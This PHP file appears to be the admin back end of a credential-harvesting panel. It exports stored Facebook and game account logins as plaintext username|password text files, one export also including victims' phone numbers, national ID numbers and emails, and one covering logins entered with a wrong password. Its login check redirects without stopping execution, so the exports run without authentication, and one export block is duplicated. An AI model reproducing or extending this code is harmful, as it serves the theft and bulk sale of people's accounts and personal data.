<?php
require_once ('Config.php');
$Select_API_DangDung1 = mysqli_query($ConnectData,"SELECT * FROM administrator WHERE id='1'");
$Row= mysqli_fetch_assoc($Select_API_DangDung1);
$Cookie=$Row['cookie'];
if(!isset($_COOKIE[$Cookie]))
{
 header("location: ../cp/Login.php");
}
date_default_timezone_set('Asia/Ho_Chi_Minh');
$startTime = date("m/d/Y - H:i:a"); 
if (isset($_GET['XuatAccFacebook'])){
$TableName = "acc"; 
$strSQL = "SELECT * FROM $TableName ORDER BY id DESC";
$sql = mysqli_query($ConnectData, $strSQL); 
if (mysqli_error($ConnectData)) { 
echo mysqli_error($ConnectData);
} else {
while ($row = mysqli_fetch_array($sql)) {
$Output .= '' . $row["username"] . '|' . $row["password"] . '';
$Output .= "\n";
}
$TimeNow = date('d_m_Y-h_i_s a', time());
$sql = "SELECT * FROM acc";
if ($result=mysqli_query($ConnectData,$sql)) {
    $rowcount=mysqli_num_rows($result);
}
$Filename .= $rowcount.'FB  '. $startTime . ".txt";
header('Content-type: application/txt');
header('Content-Disposition: attachment; filename=' . $Filename);
echo $Output;
}
exit;
} 
date_default_timezone_set('Asia/Ho_Chi_Minh');
$startTime = date("m/d/Y - H:i:a"); 
if (isset($_GET['XuatAccFacebook'])){
$TableName = "acc"; 
$strSQL = "SELECT * FROM $TableName ORDER BY id DESC";
$sql = mysqli_query($ConnectData, $strSQL); 
if (mysqli_error($ConnectData)) { 
echo mysqli_error($ConnectData);
} else {
while ($row = mysqli_fetch_array($sql)) {
$Output .= '' . $row["username"] . '|' . $row["password"] . '';
$Output .= "\n";
}
$TimeNow = date('d_m_Y-h_i_s a', time());
$sql = "SELECT * FROM acc";
if ($result=mysqli_query($ConnectData,$sql)) {
    $rowcount=mysqli_num_rows($result);
}
$Filename .= $rowcount.'FB  '. $startTime . ".txt";
header('Content-type: application/txt');
header('Content-Disposition: attachment; filename=' . $Filename);
echo $Output;
}
exit;
} 
elseif (isset($_GET['XuatAccGasTong'])){
date_default_timezone_set('Asia/Ho_Chi_Minh');
$TableName = "account_main"; 
$Output = "";
$strSQL = "SELECT * FROM $TableName ORDER BY id DESC";
$sql = mysqli_query($ConnectData, $strSQL); 
if (mysqli_error($ConnectData)) { 
echo mysqli_error($ConnectData);
} else {
$columns_total = mysqli_num_fields($sql);
while ($row = mysqli_fetch_array($sql)) {
$Output .= '' . $row["user"] . '|' . $row["pass"] . '';
$Output .= "\n";
}
$TimeNow = date('d_m_Y-h_i_s a', time());
$sql = "SELECT * FROM $TableName ";
if ($result=mysqli_query($ConnectData,$sql)) {
    $rowcount=mysqli_num_rows($result);
}
$Filename .= $rowcount.'TongGas  '. $startTime . ".txt";
header('Content-type: application/txt');
header('Content-Disposition: attachment; filename=' . $Filename);
echo $Output;
}
exit;
}
elseif (isset($_GET['XuatAccGasAuthen'])){
$TableName = "account_sms"; 
$Output = "";
$strSQL = "SELECT * FROM $TableName ORDER BY id DESC";
$sql = mysqli_query($ConnectData, $strSQL); 
if (mysqli_error($ConnectData)) { 
echo mysqli_error($ConnectData);
} else {
$columns_total = mysqli_num_fields($sql);
while ($row = mysqli_fetch_array($sql)) {
$Output .= '' . $row["user"].'|'.
$row["pass"].'|'. 
$row["sdt"].'|'. 
$row["level"].'|'. 
$row["sotuong"].'|'. 
$row["fb"].'|'. 
$row["cmnd"].'|'. 
$row["email"].'|'. 
$row["note"].
'';
$Output .= "\n";
}
$TimeNow = date('d_m_Y-h_i_s a', time());
$sql = "SELECT * FROM $TableName";
if ($result=mysqli_query($ConnectData,$sql)) {
    $rowcount=mysqli_num_rows($result);
}
$Filename .= $rowcount.'Authen  '. $startTime . ".txt";
header('Content-type: application/txt');
header('Content-Disposition: attachment; filename=' . $Filename);
echo $Output;
}
exit;
}
elseif (isset($_GET['XuatAccGasTTT'])){
$TableName = "account_ttt"; 
$Output = "";
$strSQL = "SELECT * FROM $TableName ORDER BY id DESC";
$sql = mysqli_query($ConnectData, $strSQL); 
if (mysqli_error($ConnectData)) { 
echo mysqli_error($ConnectData);
} else {
$columns_total = mysqli_num_fields($sql);
while ($row = mysqli_fetch_array($sql)) {
$Output .= '' . $row["user"].'|'.
$row["pass"].'|'. 
$row["level"].'|'. 
$row["sotuong"].'';
$Output .= "\n";
}
$TimeNow = date('d_m_Y-h_i_s a', time());
$sql = "SELECT * FROM $TableName";
if ($result=mysqli_query($ConnectData,$sql)) {
    $rowcount=mysqli_num_rows($result);
}
$Filename .= $rowcount.'TTT  '. $startTime . ".txt";
header('Content-type: application/txt');
header('Content-Disposition: attachment; filename=' . $Filename);
echo $Output;
}
exit;
}
elseif (isset($_GET['XuatAccGasLoiPassword'])){
$TableName = "account_loi"; 
$Output = "";
$strSQL = "SELECT * FROM $TableName ORDER BY id DESC";
$sql = mysqli_query($ConnectData, $strSQL); 
if (mysqli_error($ConnectData)) { 
echo mysqli_error($ConnectData);
} else {
$columns_total = mysqli_num_fields($sql);
while ($row = mysqli_fetch_array($sql)) {
$Output .=''.$row["user"].'|'.$row["pass"].'';
$Output .= "\n";
}
$sql = "SELECT * FROM $TableName";
if ($result=mysqli_query($ConnectData,$sql)) {
    $rowcount=mysqli_num_rows($result);
}
$Filename .= $rowcount.'Loi  '. $startTime . ".txt";
header('Content-type: application/txt');
header('Content-Disposition: attachment; filename=' . $Filename);
echo $Output;
}
exit;
}
?>					
                